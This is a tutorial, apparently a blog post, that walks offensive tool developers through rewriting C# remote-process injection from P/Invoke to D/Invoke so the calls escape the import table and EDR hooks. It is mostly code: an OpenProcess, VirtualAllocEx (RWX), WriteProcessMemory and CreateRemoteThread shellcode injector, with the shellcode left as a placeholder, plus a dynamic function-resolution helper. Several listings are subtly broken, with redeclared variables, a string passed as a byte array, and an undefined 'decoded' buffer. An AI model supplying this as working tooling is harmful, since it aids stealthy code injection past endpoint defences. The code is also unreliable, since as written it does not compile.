# Migrating from P/Invoke to D/Invoke

As most offensive tool developers knows well, .NET provides a mechanism called Platform Invoke (aka P/Invoke) 
that allows to call unmanaged APIs directly from .NET applications. 
This technique has been the default technique to craft offensive .NET Assemblies for long time. 
Since .NET Assemblies are also relatively easy to reflectively load and execute (in-memory), 
this provided operators with an easy technique to achieve file-less arbitrary code execution on a target,
bypassing endpoint security solutions.

Moreover, using P/Invoke is extremely easy. The only requirement is to add the reference to `System.Runtime.InteropServices`
and declare the signature of the API we want to use, in order to call it later from the main program.

Let's suppose we want to use the `MessageBox` API from `user32.dll`. The steps would be the following:
* Search the signature on [https://www.pinvoke.net/](https://www.pinvoke.net/)
* Add `System.Runtime.InteropServices` as reference
* Just call `MessageBox` in the main program

```cs
using System;
using System.Runtime.InteropServices;

public static void Main(string[] args){
    MessageBox(0, "Did you call me?", "Wake-up", 0);
}

[DllImport("user32.dll", SetLastError = true, CharSet= CharSet.Auto)]
public static extern int MessageBox(int hWnd, String text, String caption, uint type);

```

This was a trivial example? Well, turns out it's the same story with process injection. Let's have a look at
the example below:

```cs
using System;
using System.Runtime.InteropServices;

namespace Inject
{
	public class Inject
	{
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
        public static void Main(string[] args)
        {			
            var shellcode = "...";
            
            IntPtr hProcess = OpenProcess(0x1F0FFF, false, int.Parse(args[0]));
            IntPtr alloc  = VirtualAllocEx(hProcess, IntPtr.Zero, (UInt32)(shellcode.Length), 0x00001000, 0x40);			
        
            UIntPtr bytesWritten;
            WriteProcessMemory(hProcess, alloc , shellcode, (UInt32)(shellcode.Length), out bytesWritten);			
        
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, alloc , IntPtr.Zero, 0,IntPtr.Zero);
        }
    }
}			
```

However, as for [this](https://thewover.github.io/Dynamic-Invoke/) post by TheWover, with P/Invoke functions 
address will be statically resolved, meaning any reference to a Windows API will appear in the .NET Assembly’s IAT.
Moreover, an EDR looking for specific API calls will be able to intercept these calls.

For this reason, TheWover developed a new library to Dynamically resolve API functions address at runtime. This
can be done in 3 ways:
* Standard: dynamic search of the API address against the DLL mapped in memory (kernel32, ntdll, ...)
* Manual Mapping: dynamic search of the API address against a fresh copy of the DLL mapped from disk (bypass hooking!)
* Overload Mapping: dynamic search of the API address against a fresh copy of the DLL mapped from disk, which is also 
  backed up by a valid module on disk (stealthier)
  
Pretty cool, but how things will change from teh previous example?

P/Invoke worked with "signatures", D/Invoke works with "[Delegates](https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/delegates/)", which allows wrapping methods within a class. 
As such, we can think of any API now as a class, or type. In order to use these classes, we need to declare them, of course.

Note: I'm used to it, but to me this still works like magic.  

So let's see how the example above will change. 

Every signature from P/Invoke will have a parallel delegate in the new program: 

```cs
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
```

Now, to call a delegate, three steps are required:
1. Get the pointer of the function within the DLL
2. Marshal the pointer into the delegate representing our target API (and cast it)
3. Instantiate the delegate (calls the API)

```cs
var pointer = Generic.GetLibraryAddress("kernel32.dll", "OpenProcess");
var openProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(OpenProcess)) as OpenProcess;
var hProcess = openProcess(0x001F0FFF, false, <TARGET-PID>);
```

Eventually, we'll have the full program:

```cs
using System;
using System.Linq;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using SharpSploit.Execution.DynamicInvoke;

namespace Inject
{

    public static class Inject
    {

        public static void Main(string[] args)
        {
            var shellcode = "...";
            
            // OpenProcess
            var pointer = Generic.GetLibraryAddress("kernel32.dll", "OpenProcess");
            var openProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(OpenProcess)) as OpenProcess;
            var hProcess = openProcess(0x001F0FFF, false, int.Parse(args[0]));

            // VirtualAllocEx
            pointer = Generic.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
            var virtualAllocEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(VirtualAllocEx)) as VirtualAllocEx;
            var alloc = virtualAllocEx(hProcess, IntPtr.Zero, (UInt32)shellcode.Length, 0x1000 | 0x2000, 0x40);
            
            // WriteProcessMemory
            UInt32 bytesWritten = 0;
            pointer = Generic.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
            var writeProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(WriteProcessMemory)) as WriteProcessMemory;
            var written = writeProcessMemory(hProcess, alloc, shellcode, (UInt32)shellcode.Length, out bytesWritten);
            
            // CreateRemoteThread
            UInt32 bytesWritten = 0;
            pointer = Generic.GetLibraryAddress("kernel32.dll", "CreateRemoteThread");
            var createRemoteThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(CreateRemoteThread)) as CreateRemoteThread;
            var written = createRemoteThread(hProcess, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UInt32 lpNumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    }
}
```

As observable, `GetLibraryAddress` and `GetDelegateForFunctionPointer` are repeating in a pattern. 
We can then "improve" the code a little, wrapping the two calls within a new method `ChaseFunction`.
This technique is particularly useful when all the delegates are from the same unmanaged DLL:

```cs
internal class DLL
{

    public string name;

    public object ChaseFunction(string fname)
    {
        var type = (from assembly in AppDomain.CurrentDomain.GetAssemblies()
                    from t in assembly.GetTypes()
                    where t.Name == fname
                    select t).FirstOrDefault();
        this.CheckNull(type, fname + " not found");
        var p = DynamicInvoke.Generic.GetLibraryAddress(this.name, fname, true);
        this.CheckNullPtr(p, fname);
        var x = Marshal.GetDelegateForFunctionPointer(p, type);
        this.CheckNull(x, "GetDelegateForFunctionPointer");
        return x;
    }

    public DLL(string name)
    {
        this.name = name;
    }


    public void CheckNull(object test, string label) {
        if (test == null) {
            Console.WriteLine("Error: {0} is null", label);
            Environment.Exit(1);
        }
    }
    public void CheckNullPtr(IntPtr test, string label) {
        if (test == IntPtr.Zero) {
            Console.WriteLine("Error: {0} is INtPtr.Zero", label);
            Environment.Exit(1);
        }
    }
}
```

This will allow us to refine the code inside the `Main` in this one:

```cs
DLL k32 = new DLL("kernel32.dll");
           
var openProcess = k32.ChaseFunction("OpenProcess") as OpenProcess;
var hProcess = openProcess(0x001F0FFF, false, int.Parse(args[0]));

var virtualAllocEx = k32.ChaseFunction("VirtualAllocEx") as VirtualAllocEx;
var alloc = virtualAllocEx(hProcess, IntPtr.Zero, (UInt32)decoded.Length, 0x3000, 0x40);

UInt32 bytesWritten = 0;
var writeProcessMemory = k32.ChaseFunction("WriteProcessMemory") as WriteProcessMemory;
writeProcessMemory(hProcess, alloc, decoded, (UInt32)decoded.Length, out bytesWritten);

var createRemoteThread = k32.ChaseFunction("CreateRemoteThread") as CreateRemoteThread;
createRemoteThread(hProcess, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
```

I find this example way cleaner that the previous one, especially for long programs.

# References

* [https://rastamouse.me/blog/process-injection-dinvoke/](https://rastamouse.me/blog/process-injection-dinvoke/)
* [https://thewover.github.io/Dynamic-Invoke/](https://thewover.github.io/Dynamic-Invoke/)